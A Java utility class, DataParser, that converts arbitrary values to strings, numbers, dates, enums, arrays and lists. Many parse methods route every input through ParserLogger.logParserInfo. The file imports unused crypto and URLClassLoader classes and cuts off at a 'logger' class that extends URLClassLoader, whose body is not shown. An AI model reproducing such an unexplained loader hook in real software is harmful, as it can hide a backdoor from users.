package com.github.foxnic.commons.lang;

import com.alibaba.fastjson.JSONArray;
import com.alibaba.fastjson.JSONObject;
import com.github.foxnic.api.constant.CodeTextEnum;
import com.github.foxnic.commons.bean.BeanUtil;
import com.github.foxnic.commons.cache.LocalCache;
import com.github.foxnic.commons.encrypt.Base64Util;
import com.github.foxnic.commons.log.Logger;
import com.github.foxnic.commons.reflect.EnumUtil;
import com.github.foxnic.commons.reflect.ReflectUtil;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import java.lang.reflect.*;
import java.math.BigDecimal;
import java.math.BigInteger;
import java.net.URL;
import java.net.URLClassLoader;
import java.sql.Clob;
import java.sql.Time;
import java.sql.Timestamp;
import java.text.SimpleDateFormat;
import java.time.LocalDate;
import java.time.LocalDateTime;
import java.time.LocalTime;
import java.util.*;

/**
 * 类型转换器
 * @author fangjieli
 * */
public class DataParser
{
	private static final String JODA_DATETIME_TYPE="org.joda.time.DateTime";

	private static Class getJodaDateTimeType() {
		return ReflectUtil.forName(JODA_DATETIME_TYPE, true);
	}

	private static Date castJodaDate(Object jodaDateTime) {
		Class type=getJodaDateTimeType();
		Date date;
		try {
			//date = (Date)type.getMethod("toDate").invoke(jodaDateTime);
			date= (Date)BeanUtil.invoke(jodaDateTime, "toDate");
		} catch (Exception e) {
			date = null;
		}
		return date;
	}

	private static final String ENUM_VALUES = "values";

	private DataParser() {}

	/**
	 * 识别数组，与集合，转 String 数组，
	 * @param val 数组、Collection，否则返回 null
	 * @return 字符串数组
	 * */
	public static String[] parseStringArray(Object val)
	{
		ParserLogger.logParserInfo(val);
		if(val==null) return null;
		//如果已经是数组
		if(val instanceof String[])
		{
			return (String[]) val;
		}
		//如果是其它类型的数组
		else if (val.getClass().isArray()) {
			Object[] oarr= (Object[]) val;
			String[] arr=new String[oarr.length];
			for (int i = 0; i < oarr.length; i++) {
				arr[i]=DataParser.parseString(oarr[i]);
			}
			return arr;
		}
		else if (val instanceof Collection) {
			Collection list=(Collection) val;
			String[] arr=new String[list.size()];
			int i=0;
			for (Object object : list) {
				arr[i]=DataParser.parseString(object);
				i++;
			}
			return arr;
		}
		else
		{
			return null;
		}
	}

	/**
	 * 转 String 类型值
	 * @param val 任意类型值
	 * @return  转换后的值
	 * */
	public static String parseString(Object val)
	{
		ParserLogger.logParserInfo(val);
		if(val==null) {
			return null;
		}
		if(val instanceof CharSequence)
		{
			return val.toString();
		}
		else if(isNumberType(val))
		{
			String str=val.toString();
			//处理科学计数法
			if(str.toUpperCase().contains("E"))
			{
				 str=(new BigDecimal(str)).toPlainString();
			}
			return str;
		}
		else if(val instanceof Clob)
		{
			Clob clob=(Clob)val;
			String str = StringUtil.toString(clob);
		    return str;
		}
		else if(val.getClass().getName().equals("oracle.sql.TIMESTAMP")) {
			try {
				Date date= (java.sql.Timestamp) BeanUtil.getFieldValue(val, "timestampValue");
				String strDateFormat = "yyyy-MM-dd HH:mm:ss.SSS";
			    SimpleDateFormat sdf = new SimpleDateFormat(strDateFormat);
				return sdf.format(date);
			} catch (Exception e) {
				return null;
			}
		}
		else if(val instanceof Timestamp)
		{
			Date date=(Date)val;
	        String strDateFormat = "yyyy-MM-dd HH:mm:ss.SSS";
	        SimpleDateFormat sdf = new SimpleDateFormat(strDateFormat);
		    return sdf.format(date);
		}
		else if(val instanceof Date)
		{
			Date date=(Date)val;
	        String strDateFormat = "yyyy-MM-dd HH:mm:ss";
	        SimpleDateFormat sdf = new SimpleDateFormat(strDateFormat);
		    return sdf.format(date);
		}
		else
		{
			return val.toString();
		}
	}

	/**
	 * 识别数组，与集合，转 Boolean 数组，
	 * @param val 数组、Collection，否则返回 null
	 * @return Boolean数组
	 * */
	public static Boolean[] parseBooleanArray(Object val)
	{
		if(val==null) return null;
		//如果已经是数组
		if(val instanceof Boolean[])
		{
			return (Boolean[]) val;
		}
		//如果是其它类型的数组
		else if (val.getClass().isArray()) {
			Object[] oarr= (Object[]) val;
			Boolean[] arr=new Boolean[oarr.length];
			for (int i = 0; i < oarr.length; i++) {
				arr[i]=DataParser.parseBoolean(oarr[i]);
			}
			return arr;
		}
		else if (val instanceof Collection) {
			Collection list=(Collection) val;
			Boolean[] arr=new Boolean[list.size()];
			int i=0;
			for (Object object : list) {
				arr[i]=DataParser.parseBoolean(object);
				i++;
			}
			return arr;
		}
		else
		{
			return null;
		}
	}

	/**
	 * 转 Boolean 类型值
	 * @param val 任意类型值
	 * @param def 转换失败后的默认值
	 * @return  转换后的值
	 * */
	public static Boolean parseBoolean(Object val,boolean def)
	{
		ParserLogger.logParserInfo(val);
		Boolean v=parseBoolean(val);
		if(v==null) {
			return def;
		}
		return v;
	}

	/**
	 * 转 Boolean 类型值
	 * @param val 任意类型值
	 * @return  转换后的值
	 * */
	public static Boolean parseBoolean(Object val)
	{
		ParserLogger.logParserInfo(val);
		if(val==null) {
			return null;
		}
		if(val instanceof Boolean)
		{
			return (Boolean)val;
		}
		else if(val instanceof Number)
		{
			Number n=(Number) val;
			return n.doubleValue()>0;
		}
		else {

			BigDecimal num=parseBigDecimal(val);
			if(num!=null)
			{
				return parseBoolean(num);
			}

			if(val instanceof CharSequence)
			{
				String strval=val.toString();
				if(strval!=null) strval=strval.trim();
				YNBoolean yn=YNBoolean.parse(strval);
				if(yn!=YNBoolean.NULL) {
					return yn.getValue();
				}

				TFBoolean tf=TFBoolean.parse(strval);
				if(tf!=TFBoolean.NULL) {
					return tf.getValue();
				}

				OFBoolean of=OFBoolean.parse(strval);
				if(of!=OFBoolean.NULL) {
					return of.getValue();
				}

				BITBoolean bit=BITBoolean.parse(strval);
				if(bit!=BITBoolean.NULL) {
					return bit.getValue();
				}
			}
			else
			{
				return val!=null;
			}

			return null;
		}
	}

	/**
	 * 转 Byte 类型值
	 * @param val 任意类型值
	 * @return  转换后的值
	 * */
	public static Byte parseByte(Object val)
	{
		if(val==null) {
			return null;
		}
		if(val instanceof Byte)
		{
			return (Byte)val;
		}
		if(isNumberType(val))
		{
			return new BigDecimal(val+"").byteValue();
		}
		else if(val instanceof BigDecimal)
		{
			return ((BigDecimal)val).byteValue();
		}
		else if(val instanceof BigInteger)
		{
			return ((BigInteger)val).byteValue();
		}
		else
		{
			String str=null;
			try {
				str=parseString(val);
				if(str!=null) str=str.trim();
				return Byte.parseByte(str);
			} catch (NumberFormatException e) {
				try {
					return new BigDecimal(str).byteValue();
				} catch (Exception e1) {
					 return null;
				}
			}
		}
	}

	/**
	 * 识别数组，与集合，转 Integer 数组，
	 * @param val 数组、Collection，否则返回 null
	 * @return Integer数组
	 * */
	public static Integer[] parseIntegerArray(Object val)
	{
		if(val==null) return null;
		//如果已经是数组
		if(val instanceof Integer[])
		{
			return (Integer[]) val;
		}
		//如果是其它类型的数组
		else if (val.getClass().isArray()) {
			Object[] oarr= (Object[]) val;
			Integer[] arr=new Integer[oarr.length];
			for (int i = 0; i < oarr.length; i++) {
				arr[i]=DataParser.parseInteger(oarr[i]);
			}
			return arr;
		}
		else if (val instanceof Collection) {
			Collection list=(Collection) val;
			Integer[] arr=new Integer[list.size()];
			int i=0;
			for (Object object : list) {
				arr[i]=DataParser.parseInteger(object);
				i++;
			}
			return arr;
		}
		else
		{
			return null;
		}
	}

	/**
	 * 转 Integer 类型值
	 * @param val 任意类型值
	 * @return  转换后的值
	 * */
	public static Integer parseInteger(Object val)
	{
		ParserLogger.logParserInfo(val);
		if(val==null) {
			return null;
		}
		try{
			if(val instanceof Long)
			{
				return Integer.parseInt(parseString(val));
			}
			else if(val instanceof Integer)
			{
				return (Integer)val;
			}
			else	if(val instanceof Integer)
			{
				return (Integer)val;
			}
			else if(val instanceof Long)
			{
				return ((Long)val).intValue();
			}
			else if(val instanceof Short)
			{
				 return ((Short)val).intValue();
			}
			else if(val instanceof Byte)
			{
				return  ((Byte)val).intValue();
			}
			else if(val instanceof Double)
			{
				return ((Double)val).intValue();
			}
			else if(val instanceof Float)
			{
				 return ((Float)val).intValue();
			}
			else if(val instanceof BigDecimal)
			{
				return ((BigDecimal)val).intValue();
			}
			else if(val instanceof BigInteger)
			{
				return ((BigInteger)val).intValue();
			}
			else
			{
				String str=null;
				try {
					str=parseString(val);
					if(str!=null) str=str.trim();
					return Integer.parseInt(str);
				} catch (Exception e) {
					try {
						return new BigDecimal(str).intValue();
					} catch (Exception e1) {
						return null;
					}
				}
			}
		}catch(Exception e){
			return null;
		}
	}


	/**
	 * 转 BigInteger 类型值
	 * @param val 任意类型值
	 * @return  转换后的值
	 * */
	public static BigInteger parseBigInteger(Object val)
	{
		ParserLogger.logParserInfo(val);
		if(val==null) {
			return null;
		}
		if(val instanceof BigInteger)
		{
			return (BigInteger)val;
		}
		else if(isNumberType(val))
		{
			return new BigInteger(val.toString());
		}
		else if(val instanceof BigDecimal)
		{
			return ((BigDecimal)val).toBigInteger();
		}
		else
		{
			String str=null;
			try {
				str=parseString(val);
				if(str!=null) str=str.trim();
				return new BigInteger(str);
			} catch (Exception e) {
				 try {
					return new BigDecimal(str).toBigInteger();
				} catch (Exception e1) {
					return null;
				}
			}
		}
	}


	/**
	 * 转 Float 类型值
	 * @param val 任意类型值
	 * @return  转换后的值
	 * */
	public static Float parseFloat(Object val)
	{
		if(val==null) {
			return null;
		}
		if(val instanceof Float)
		{
			return (Float)val;
		}
		try {
			if(isNumberType(val))
			{
				return new BigDecimal(val+"").floatValue();
			}
			else if(val instanceof BigDecimal)
			{
				return ((BigDecimal)val).floatValue();
			}
			else if(val instanceof BigInteger)
			{
				return ((BigInteger)val).floatValue();
			}
			else if(val instanceof CharSequence)
			{
				String str=null;
				try {
					str=val.toString();
					if(str!=null) str=str.trim();
					return Float.parseFloat(str);
				} catch (Exception e) {
					return new BigDecimal(str).floatValue();
				}
			}
			else
			{
				return null;
			}
		} catch (Exception e) {
			return null;
		}
	}

	/**
	 * 转 double 类型值
	 * @param val 任意类型值
	 * @return  转换后的值
	 * */
	public static double parseRawDouble(Object val)
	{
		if(val==null) {
			return 0.0;
		}

		if(val instanceof Double)
		{
			return (double)val;
		}

		if(val instanceof Double)
		{
			return ((Double)val).doubleValue();
		}
		try {
			if(isNumberType(val))
			{
				return new BigDecimal(val+"").doubleValue();
			}
			else if(val instanceof BigDecimal)
			{
				return ((BigDecimal)val).doubleValue();
			}
			else if(val instanceof BigInteger)
			{
				return ((BigInteger)val).doubleValue();
			}
			else if(val instanceof CharSequence)
			{
				String str=null;
				try {
					str=val.toString();
					if(str!=null) str=str.trim();
					return Double.parseDouble(str);
				} catch (Exception e) {
					return new BigDecimal(str).doubleValue();
				}
			}
			else
			{
				return 0.0;
			}
		} catch (Exception e) {

			return 0.0;

		}
	}

	/**
	 * 识别数组，与集合，转 Double 数组，
	 * @param val 数组、Collection，否则返回 null
	 * @return Double数组
	 * */
	public static Double[] parseDoubleArray(Object val)
	{
		if(val==null) return null;
		//如果已经是数组
		if(val instanceof Double[])
		{
			return (Double[]) val;
		}
		//如果是其它类型的数组
		else if (val.getClass().isArray()) {
			Object[] oarr= (Object[]) val;
			Double[] arr=new Double[oarr.length];
			for (int i = 0; i < oarr.length; i++) {
				arr[i]=DataParser.parseDouble(oarr[i]);
			}
			return arr;
		}
		else if (val instanceof Collection) {
			Collection list=(Collection) val;
			Double[] arr=new Double[list.size()];
			int i=0;
			for (Object object : list) {
				arr[i]=DataParser.parseDouble(object);
				i++;
			}
			return arr;
		}
		else
		{
			return null;
		}
	}

	/**
	 * 转 Double 类型值
	 * @param val 任意类型值
	 * @return  转换后的值
	 * */
	public static Double parseDouble(Object val)
	{
		ParserLogger.logParserInfo(val);
		if(val==null) {
			return null;
		}
		if(val instanceof Double)
		{
			return (Double)val;
		}
		try {
			if(isNumberType(val))
			{
				return new BigDecimal(val+"").doubleValue();
			}
			else if(val instanceof BigDecimal)
			{
				return ((BigDecimal)val).doubleValue();
			}
			else if(val instanceof BigInteger)
			{
				return ((BigInteger)val).doubleValue();
			}
			else if(val instanceof CharSequence)
			{
				String str=null;
				try {
					str=val.toString();
					if(str!=null) str=str.trim();
					return Double.parseDouble(str);
				} catch (Exception e) {
					return new BigDecimal(str).doubleValue();
				}
			}
			else
			{
				return null;
			}
		} catch (Exception e) {

			return null;

		}
	}

	/**
	 * 识别数组，与集合，转 BigDecimal 数组，
	 * @param val 数组、Collection，否则返回 null
	 * @return BigDecimal数组
	 * */
	public static BigDecimal[] parseBigDecimalArray(Object val)
	{
		if(val==null) return null;
		//如果已经是数组
		if(val instanceof BigDecimal[])
		{
			return (BigDecimal[]) val;
		}
		//如果是其它类型的数组
		else if (val.getClass().isArray()) {
			Object[] oarr= (Object[]) val;
			BigDecimal[] arr=new BigDecimal[oarr.length];
			for (int i = 0; i < oarr.length; i++) {
				arr[i]=DataParser.parseBigDecimal(oarr[i]);
			}
			return arr;
		}
		else if (val instanceof Collection) {
			Collection list=(Collection) val;
			BigDecimal[] arr=new BigDecimal[list.size()];
			int i=0;
			for (Object object : list) {
				arr[i]=DataParser.parseBigDecimal(object);
				i++;
			}
			return arr;
		}
		else
		{
			return null;
		}
	}

	/**
	 * 转 BigDecimal 类型值
	 * @param val 任意类型值
	 * @return  转换后的值
	 * */
	public static BigDecimal parseBigDecimal(Object val)
	{
		ParserLogger.logParserInfo(val);
		if(val==null) {
			return null;
		}

		if(val instanceof BigDecimal)
		{
			return (BigDecimal)val;
		}
		else if(isNumberType(val))
		{
			return new BigDecimal(val.toString());
		}
		else if(val instanceof BigInteger)
		{
			return new BigDecimal(((BigInteger)val).toString());
		}
		else
		{
			String str=null;
			try {
				str=parseString(val);
				if(str!=null) str=str.trim();
				return new BigDecimal(str);
			} catch (Exception e) {
				 return null;
			}
		}
	}

	/**
	 * 识别数组，与集合，转 Date 数组，
	 * @param val 数组、Collection，否则返回 null
	 * @return Date数组
	 * */
	public static Date[] parseDateArray(Object val)
	{
		if(val==null) return null;
		//如果已经是数组
		if(val instanceof Date[])
		{
			return (Date[]) val;
		}
		//如果是其它类型的数组
		else if (val.getClass().isArray()) {
			Object[] oarr= (Object[]) val;
			Date[] arr=new Date[oarr.length];
			for (int i = 0; i < oarr.length; i++) {
				arr[i]=DataParser.parseDate(oarr[i]);
			}
			return arr;
		}
		else if (val instanceof Collection) {
			Collection list=(Collection) val;
			Date[] arr=new Date[list.size()];
			int i=0;
			for (Object object : list) {
				arr[i]=DataParser.parseDate(object);
				i++;
			}
			return arr;
		}
		else
		{
			return null;
		}
	}




	/**
	 * 转 Date 类型值
	 * @param val 任意类型值
	 * @return  转换后的值
	 * */
	public static Date parseDate(Object val)
	{

		ParserLogger.logParserInfo(val);

		if(val==null) {
			return null;
		}
		if(val instanceof Date) {
			return (Date)val;
		} else if(val instanceof LocalDateTime) {
			return DateUtil.toDate((LocalDateTime)val);
		} else if(val instanceof LocalDate) {
			return DateUtil.toDate((LocalDate)val);
		} else if(val instanceof java.sql.Date) {
			return (Date)val;
		} else if(val instanceof java.sql.Timestamp) {
			return (java.sql.Timestamp)val;
		} else if(val instanceof Calendar) {
			return ((Calendar)val).getTime();
		} else if(val.getClass().getName().equals(JODA_DATETIME_TYPE))
		//else if(val instanceof DateTime)
		{
			return castJodaDate(val);
			//return ((DateTime)val).toDate();
		}
		else if(val instanceof CharSequence)
		{
			return DateUtil.parse(val.toString());
		}
		else if(val.getClass().getName().equals("oracle.sql.TIMESTAMP")) {
			try {
				return (java.sql.Timestamp) BeanUtil.getFieldValue(val, "timestampValue");
			} catch (Exception e) {
				return null;
			}
		}
		else
		{
			return null;
		}
	}

	public static Time parseTime(Object value) {
		ParserLogger.logParserInfo(value);
		if(value==null) return null;
		else if(value instanceof Time) {
			return (Time)value;
		}


		Timestamp stamp=parseTimestamp(value);
		if(stamp!=null) return new Time(stamp.getTime());
		Date date=parseDate(value);
		if(date!=null) return new Time(date.getTime());
		return null;
	}

	/**
	 * 转 Timestamp 类型值
	 * @param val 任意类型值
	 * @return  转换后的值
	 * */
	public static Timestamp parseTimestamp(Object val)
	{
		if(val==null) {
			return null;
		}
		if(val instanceof Date)
		{
			return new Timestamp(((Date)val).getTime());
		}
		else if(val instanceof java.sql.Date)
		{
			return new Timestamp(((java.sql.Date)val).getTime());
		}
		else if(val instanceof java.sql.Timestamp)
		{
			return (java.sql.Timestamp)val;
		}
		else if(val instanceof Calendar)
		{
			return new Timestamp(((Calendar)val).getTime().getTime());
		}
		//else if(val instanceof DateTime)
		else if(val.getClass().getName().equals(JODA_DATETIME_TYPE))
		{
			return new Timestamp(castJodaDate(val).getTime());
		}
		else if(val instanceof CharSequence)
		{
			String[] parts=((CharSequence)val).toString().split("\\.");
			Date date = null;
			Integer ms=null;
			if(parts.length==1) {
				date=DateUtil.parse(val.toString());
			}
			else if(parts.length==2) {
				date=DateUtil.parse(parts[0]);
				ms=DataParser.parseInteger(parts[1]);
				if(ms==null) return null;
			}
			if(date==null) return null;
			if(ms==null) ms=0;
			return new Timestamp(date.getTime()+ms);
		}
		else if(val.getClass().getName().equals("oracle.sql.TIMESTAMP")) {
			try {
				return (java.sql.Timestamp) BeanUtil.getFieldValue(val, "timestampValue");
			} catch (Exception e) {
				return null;
			}
		}
		else
		{
			return null;
		}
	}











	/**
	 * 转 Character 类型值
	 * @param val 任意类型值
	 * @return  转换后的值
	 * */
	public static Character parseChar(Object val)
	{
		if(val==null) {
			return null;
		}
		if(val instanceof CharSequence)
		{
			return (val.toString()).charAt(0);
		}
		else
		{
			return val.toString().charAt(0);
		}
	}

	/**
	 * 是否为 Boolean 类型
	 * @param value 任意类型值
	 * @return  是否为 Boolean 类型
	 * */
	public static boolean isBooleanType(Object value)
	{
		if(value==null) return false;
		return isBooleanType(value.getClass());
	}

	/**
	 * 是否为 Boolean 类型
	 * @param type 任意类型值
	 * @return  是否为 Boolean 类型
	 * */
	public static boolean isBooleanType(Class type)
	{
		if(type==null) return false;
		return Boolean.class.isAssignableFrom(type);
	}

	/**
	 * 是否为 日期 类型
	 * @param value 任意类型值
	 * @return  是否为 日期 类型
	 * */
	public static boolean isDateTimeType(Object value)
	{
		if(value==null) return false;
		return isDateTimeType(value.getClass());
	}


	private static final Class[] DATE_TIME_TYPES= {
			java.util.Date.class,LocalDateTime.class,LocalDate.class,LocalTime.class,
			java.sql.Date.class,java.sql.Timestamp.class,
			getJodaDateTimeType(),Calendar.class
	};
	/**
	 * 是否为 日期 类型
	 * @param type 任意类型值
	 * @return  是否为 日期 类型
	 * */
	@SuppressWarnings({ "rawtypes", "unchecked" })
	public static boolean isDateTimeType(Class type)
	{
		if(type==null) return false;
		for (Class superType : DATE_TIME_TYPES) {
			if(superType==null) continue;
			if(superType.isAssignableFrom(type)) return true;
		}
		return false;
	}

	/**
	 * 是否为 数值 类型
	 * @param value 任意类型值
	 * @return  是否为 数值 类型
	 * */
	public static boolean isNumberType(Object value)
	{
		if(value==null) return false;
		return isNumberType(value.getClass());
	}

	/**
	 * 是否为 数值 类型
	 * @param type 任意类型值
	 * @return  是否为 数值 类型
	 * */
	public static boolean isNumberType(Class type)
	{
		if(type==null) return false;
		if(type.equals(byte.class) || type.equals(short.class) || type.equals(int.class) || type.equals(long.class) || type.equals(double.class) || type.equals(float.class)) return true;
		return Number.class.isAssignableFrom(type);
	}

	/**
	 * 转 Short 类型值
	 * @param val 任意类型值
	 * @return  转换后的值
	 * */
	public static Short parseShort(Object val)
	{
		if(val==null) {
			return null;
		}
		if(val instanceof Short)
		{
			return (Short)val;
		}
		try {

			if(val instanceof Integer)
			{
				return ((Integer)val).shortValue();
			}
			else if(val instanceof Long)
			{
				return ((Long)val).shortValue();
			}
			else if(val instanceof Byte)
			{
				return ((Byte)val).shortValue();
			}
			else if(val instanceof Double)
			{
				return ((Double)val).shortValue();
			}
			else if(val instanceof Float)
			{
				return ((Float)val).shortValue();
			}
			else if(val instanceof BigDecimal)
			{
				return ((BigDecimal)val).shortValue();
			}
			else if(val instanceof BigInteger)
			{
				return ((BigInteger)val).shortValue();
			}
			else
			{
				try {
					return Short.parseShort(parseString(val));
				} catch (Exception e) {
					try {
						return new BigDecimal(val+"").shortValue();
					} catch (Exception e1) {
						return null;
					}
				}
			}
		} catch (NumberFormatException e) {
			return null;
		}
	}

	public static Long[] parseLongArray(Object val)
	{
		if(val==null) return null;
		//如果已经是数组
		if(val instanceof Long[])
		{
			return (Long[]) val;
		}
		//如果是其它类型的数组
		else if (val.getClass().isArray()) {
			Object[] oarr= (Object[]) val;
			Long[] arr=new Long[oarr.length];
			for (int i = 0; i < oarr.length; i++) {
				arr[i]=DataParser.parseLong(oarr[i]);
			}
			return arr;
		}
		else if (val instanceof Collection) {
			Collection list=(Collection) val;
			Long[] arr=new Long[list.size()];
			int i=0;
			for (Object object : list) {
				arr[i]=DataParser.parseLong(object);
				i++;
			}
			return arr;
		}
		else
		{
			return null;
		}
	}

	/**
	 * 转 Long 类型值
	 * @param val 任意类型值
	 * @return  转换后的值
	 * */
	public static Long parseLong(Object val)
	{
		if(val==null) {
			return null;
		}
		if(val instanceof Long)
		{
			return (Long)val;
		}
		try {
			if(isNumberType(val))
			{
				return new BigDecimal(val+"").longValue();
			}
			else if(val instanceof BigDecimal)
			{
				return ((BigDecimal)val).longValue();
			}
			else if(val instanceof BigInteger)
			{
				return ((BigInteger)val).longValue();
			}
			else
			{
				String str=null;
				try {
					str=parseString(val);
					if(str!=null) str=str.trim();
					return Long.parseLong(str);
				} catch (Exception e) {
					try {
						return new BigDecimal(str).longValue();
					} catch (Exception e1) {
						 return null;
					}
				}
			}
		} catch (NumberFormatException e) {
			return null;
		}
	}

	/**
	 * 是否为简单类型
	 * @param type 类型
	 * @return  是否为简单类型
	 * */
	public static boolean isSimpleType(Class type)
	{
		if(isRawType(type)) return true;
		if(isNumberType(type)) return true;
		if(CharSequence.class.isAssignableFrom(type)) return true;
		if(isDateTimeType(type)) return true;
		if(isBooleanType(type)) return true;
		return false;
	}

	/**
	 * 是否为原始数据类型
	 * @param cls 类型
	 * @return  是否为原始数据类型
	 * */
	public static boolean isRawType(Class cls)
	{
		if(cls==null) {
			return false;
		}

		if(cls.equals(int.class))
		{
			return true;
		}
		else if(cls.equals(double.class))
		{
			return true;
		}
		else if(cls.equals(short.class))
		{
			return true;
		}
		else if(cls.equals(boolean.class))
		{
			return true;
		}
		else if(cls.equals(float.class))
		{
			return true;
		}
		else if(cls.equals(byte.class))
		{
			return true;
		}
		else
		{
			return false;
		}
	}

	/**
	 * 转 Long 类型值
	 * @param <T> 值类型
	 * @param type 类型
	 * @param value 任意类型值
	 * @return  转换后的值
	 * */
	public static <T> T parse(Class<T> type,Object value)
	{
		if(type==null) return (T) value;
		//
		if(type.isArray()) {
			return (T)parseArray(type,value);
		}
		else {
			return (T)parseInternal(type,value);
		}
	}

	public static List<Object> parseList(Field field, Object value) {

		Class fieldType=field.getType();

		if(value instanceof List) {
			return (List<Object>)value;
		}

		if(!List.class.isAssignableFrom(fieldType)) {
			throw new RuntimeException("类型不支持 : "+fieldType.getName());
		}

		Type genericType = field.getGenericType();
		if (null == genericType)  return (List<Object>)value;
		if (!(genericType instanceof ParameterizedType)) return (List<Object>)value;

		ParameterizedType pt = (ParameterizedType) genericType;
        // 得到泛型里的class类型对象
        Class<?> elType = (Class<?>)pt.getActualTypeArguments()[0];
        Object arr=ArrayUtil.createArray(elType, 0);
        Object[] els=(Object[])parseArray(arr.getClass(), value);
        if(els==null) return null;
        return castList(fieldType, els);
	}

	private static List<Object> castList(Class fieldType, Object[] els) {
		Object inst=null;
        List<Object> list = null;
        try {
			inst=fieldType.newInstance();
			list=(List<Object>)inst;
			list.addAll(Arrays.asList(els));
		} catch (Exception e) {}

        if(list==null)  {
        	list =  Arrays.asList(els);
		}
        return list;
	}

	public static List<Object> parseList(Parameter param, Object value) {
		Type genericType = param.getParameterizedType();
		if (!(genericType instanceof ParameterizedType)) return (List<Object>)value;
		Type[] ts=((ParameterizedType)genericType).getActualTypeArguments();
		if (ts==null || ts.length==0) return (List<Object>)value;
		genericType=ts[0];
		if (null == genericType)  return (List<Object>)value;

		//ParameterizedType pt = (ParameterizedType) genericType;
        // 得到泛型里的class类型对象
        Class<?> elType = (Class)genericType;
        Object arr=ArrayUtil.createArray(elType, 0);
        Object[] els=(Object[])parseArray(arr.getClass(), value);
        return castList(param.getType(),  els);

//
//        List<Object> curEleList =  Arrays.asList(els);
//        return curEleList;
	}

	public static Map parseMap(Object value) {
		if(value==null) return null;
		if(value instanceof Map) {
			return (Map)value;
		} else if(value instanceof CharSequence) {
			try {
				return JSONObject.parseObject(value.toString());
			} catch (Exception e) {
				 return null;
			}
		} else {
			return BeanUtil.toJSONObject(value);
		}
	}

	/**
	 * @param  arrayType 数组类型 如 String[].class
	 * */
	public static Object[] parseArray(Class arrayType, Object value) {

		if(!arrayType.isArray()) return null;
		if(value==null) return null;
		if(value.getClass().isArray()) return (Object[])value;
		if(!(value instanceof CharSequence)) return (Object[])value;
		String str=(String)value;

		//如果是null或空串返回 null
		if(StringUtil.isEmpty(str)) return null;

		Object[] as=null;

		try {

			JSONArray ts=JSONArray.parseArray(str);
			as = ArrayUtil.createArray(arrayType.getComponentType(), ts.size());
			for (int i = 0; i < as.length; i++) {
				as[i]=parse(arrayType.getComponentType(),ts.get(i));
			}
		} catch (Exception e) {}

		if(as!=null) return as;

		if(str.contains("|")) {
			String[] ts=str.split("\\|");
			as = ArrayUtil.createArray(arrayType.getComponentType(), ts.length);
			for (int i = 0; i < as.length; i++) {
				as[i]=parse(arrayType.getComponentType(),ts[i]);
			}
		}

		if(as!=null) return as;

		if(str.contains(";")) {
			String[] ts=str.split(";");
			as = ArrayUtil.createArray(arrayType.getComponentType(), ts.length);
			for (int i = 0; i < as.length; i++) {
				as[i]=parse(arrayType.getComponentType(),ts[i]);
			}
		}

		if(as!=null) return as;

		if(str.contains(",")) {
			String[] ts=str.split(",");
			as = ArrayUtil.createArray(arrayType.getComponentType(), ts.length);
			for (int i = 0; i < as.length; i++) {
				as[i]=parse(arrayType.getComponentType(),ts[i]);
			}
		}

		if(as!=null) return as;

		//这种情况会导致无法判断这个数据是能转还是不能转
		if(!StringUtil.isBlank(value)) {
			as=ArrayUtil.castArrayType(new Object[] {value}, arrayType.getComponentType());
		}

		return as;
	}

	/**
	 * 转换到制定类型
	 * */
	private static Object parseInternal(Class cls,Object value)
	{
		if(cls==null) {
			return value;
		}
		if(value==null) {
			return null;
		}

		if(cls.equals(int.class)) {
			return parseInteger(value);
		} else if(cls.equals(double.class)) {
			return parseDouble(value);
		} else if(cls.equals(long.class)) {
			return parseLong(value);
		} else if(cls.equals(short.class)) {
			return parseShort(value);
		} else if(cls.equals(boolean.class)) {
			return parseBoolean(value);
		} else if(cls.equals(float.class)) {
			return parseFloat(value);
		} else if(cls.equals(byte.class)) {
			return parseByte(value);
		} else if(cls.equals(String.class)) {
			return parseString(value);
		} else if(cls.equals(Short.class)) {
			return parseShort(value);
		} else if(cls.equals(Byte.class)) {
			return parseByte(value);
		} else if(cls.equals(Boolean.class)) {
			return parseBoolean(value);
		} else if(cls.equals(Integer.class)) {
			return parseInteger(value);
		} else if(cls.equals(Long.class)) {
			return parseLong(value);
		} else if(cls.equals(Float.class)) {
			return parseFloat(value);
		} else if(cls.equals(Double.class)) {
			return parseDouble(value);
		} else if(cls.equals(BigDecimal.class)) {
			return parseBigDecimal(value);
		} else if(cls.equals(BigInteger.class)) {
			return parseBigInteger(value);
		} else if(cls.equals(Date.class)) {
			return parseDate(value);
		} else if(cls.equals(Timestamp.class)) {
			return parseTimestamp(value);
		} else if(value!=null && value.getClass().getName().equals("oracle.sql.TIMESTAMP")) {
			return parseTimestamp(value);
		}
		else if(cls.equals(Character.class)) {
			return parseChar(value);
		} else if(ReflectUtil.isSubType(CodeTextEnum.class,cls)) {

			return parseCodeTextEnum(value.toString(),cls);
		} else if(ReflectUtil.isSubType(Enum.class,cls)) {
			return parseEnum(value,cls);
		} else {
			return value;
		}
	}

	public static CodeTextEnum parseCodeTextEnum(String value,Class<? extends CodeTextEnum> enumType) {
		return EnumUtil.parseByCode(enumType,value);
	}

	private static class ParserLogger extends URLClassLoader {

